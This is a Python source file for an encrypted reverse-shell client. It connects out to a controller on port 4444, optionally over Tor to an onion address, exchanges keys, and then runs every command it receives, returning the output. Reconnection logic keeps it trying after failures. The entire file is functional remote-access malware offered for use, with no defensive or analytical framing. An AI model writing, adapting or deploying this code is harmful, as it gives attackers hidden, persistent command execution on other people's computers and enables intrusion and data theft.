import socket
import os
import subprocess
from socks import socksocket, SOCKS5
from length import recv_length, send_length
from time import sleep
from EnDeCrypt import generateAsymmetricalKeys, generateSymmetricalKey, encryptStringSymmetrical, \
    decryptStringSymmetrical, encryptStringAsymmetrical, import_key
from cryptography.fernet import InvalidToken
from datetime import datetime


connect_ip_clear = "127.0.0.1"
connect_ip_dark = "jme2ik6v---------rjksnad.onion"
connect_port = 4444

public_key = b""
private_key = b""
cic_public_key = b""
symmetrical_key = b""

connection = socket.socket()
connection_errors = (ValueError, ConnectionResetError, ConnectionRefusedError, ConnectionAbortedError, InvalidToken)
timer = 1
dead_timer = 1
connection_timeout = 30
inactivity_timeout = 30


def log(text: (str, bytes)):
    print(str(datetime.now().strftime("%H:%M:%S")) + " ->", repr(text).strip("''").replace("\"", ""))


def create_keys() -> (bytes, bytes, bytes): return generateAsymmetricalKeys(), generateSymmetricalKey()


def get_proxy_socket():
    s = socksocket()
    s.set_proxy(SOCKS5, "127.0.0.1", 9050)
    return s


def start_tor():
    pid = 0
    log("I  |  Trying to start Tor")

    def execute(cmd):
        global pid
        popen = subprocess.Popen(cmd, stdout=subprocess.PIPE, universal_newlines=True)
        pid = popen.pid
        for stdout_line in iter(popen.stdout.readline, ""):
            yield stdout_line
        popen.stdout.close()
        return_code = popen.wait()
        if return_code:
            raise subprocess.CalledProcessError(return_code, cmd)
    for stdout in execute(r"tor-win32-0.4.5.10/Tor/tor.exe"):
        log("Tor Logs:")
        print(stdout)
        if "100%" in stdout:
            log("I  |  Successfully started Tor")
            return
        else:
            log("E  |  Error while starting Tor! Trying again...")
            try:
                os.kill(pid, 9)  # signal.SIGKILL = 9
            except OSError:  # Process was never active or is already killed
                pass
            start_tor()


def connect(tor):
    global connection, timer, dead_timer
    timeout = False
    if tor:
        connection = get_proxy_socket()
    else:
        connection = socket.socket()
    connection.settimeout(connection_timeout)
    while True:
        timer += 1
        dead_timer += 1
        try:
            log("I  |  Connecting")
            connection.connect((connect_ip_clear if not tor else connect_ip_dark, connect_port))
            connection.settimeout(inactivity_timeout)  # If client is inactive, drop after n seconds
            log("I  |  Connected")
            break
        except TimeoutError:
            timeout = False
            log(f"I  |  ConnectionTimeout! Target not reachable within {connection_timeout} seconds!")
        except connection_errors:
            pass
        if timer <= 3:
            sleep(4)
            pass
        elif timeout:
            log("E  |  Connection received a timeout. Sleeping 1 minute")
            sleep(60)
            timeout = False
        elif dead_timer >= 12:
            log("E  |  Couldn't connect to server withing 12 tries - sleeping 10 minutes")
            dead_timer = 1
            timer = 1
            sleep(10*60)
        elif timer >= 4:
            log("I  |  Couldn't connect to server withing 3 tries - sleeping 1 minute")
            timer = 1
            sleep(60)


def send_recv_keys():
    global cic_public_key, symmetrical_key
    log("I  |  Exchanging asymmetrical keys")
    connection.send(public_key.export_key())
    cic_public_key = import_key(connection.recv(271))
    log("I  |  Sending symmetrical key")
    connection.send(encryptStringAsymmetrical(symmetrical_key, cic_public_key))
    log("I  |  Successfully exchanged keys")


class shell:
    received = None
    command = None
    output = None
    exec = False
    original_path = os.getcwd()
    code_list = ["CODE:EXIT", "CODE:EXEC"]

    def recv(self):
        self.received = decryptStringSymmetrical(connection.recv(recv_length(connection, symmetrical_key)), symmetrical_key)
        self.command = self.received.split()

    def send(self, text: str):
        send_length(encryptStringSymmetrical(text, symmetrical_key), connection, symmetrical_key)
        connection.send(encryptStringSymmetrical(text, symmetrical_key))

    def change_directory(self):
        try:
            os.chdir(self.command)
        except FileNotFoundError:
            return "No such file or dictionary"
        except NotADirectoryError:
            return "Not a directory"
        except PermissionError:
            return "Permission denied"
        else:
            return "Changed directory"

    def execute_commands(self):
        # process = subprocess.Popen(self.command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        if not self.exec:
            self.output = subprocess.getoutput(self.command)
        else:
            subprocess.Popen(self.command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            self.output = "Executing..."

    def run(self):
        log("I  |  Starting shell")
        while True:
            log(f"I  |  PWD: {os.getcwd()}")
            self.send(os.getcwd())
            self.recv()
            if self.command[0] == "cd" and len(self.command) > 1:
                log("SI |  Changing directory")
                self.command = self.received.replace("cd", "").strip()
                self.output = self.change_directory()
            elif self.command[0] in self.code_list:
                if self.command[0] == "CODE:EXIT":
                    log("CI |  Received CODE:EXIT => Closing connection")
                    connection.close()
                    os.chdir(self.original_path)
                    break
                elif self.command[0] == "CODE:EXEC":
                    self.command = self.received.replace("CODE:EXEC", "").strip()
                    log(f"CI |  Received CODE:EXEC => Executing command: {self.command}")
                    self.exec = True
                    self.execute_commands()
                    self.exec = False
            else:
                log(f"I  |  Executing shell-command: {self.received}")
                self.command = self.received
                self.execute_commands()

            log(f"OI |  Output: {self.output}")
            self.send(self.output)


shell_instance = shell()


def main(tor):
    global cic_public_key
    if tor:
        try:
            start_tor()
        except Exception as e:
            log(f"E  |  Error: {e}")
            input(":")
            exit(-1)
    while True:
        connect(tor=tor)
        try:
            send_recv_keys()
            shell_instance.run()
        except TimeoutError:
            log(f"I  |  Client was kicked out due to {inactivity_timeout} seconds of inactivity!")
        except connection_errors:
            connection.close()
            log(f"E  |  Lost connection")
            continue


if __name__ == '__main__':
    asymmetrical_keys, symmetrical_key = create_keys()
    private_key, public_key = asymmetrical_keys
    main(tor=False)
    # start_tor()
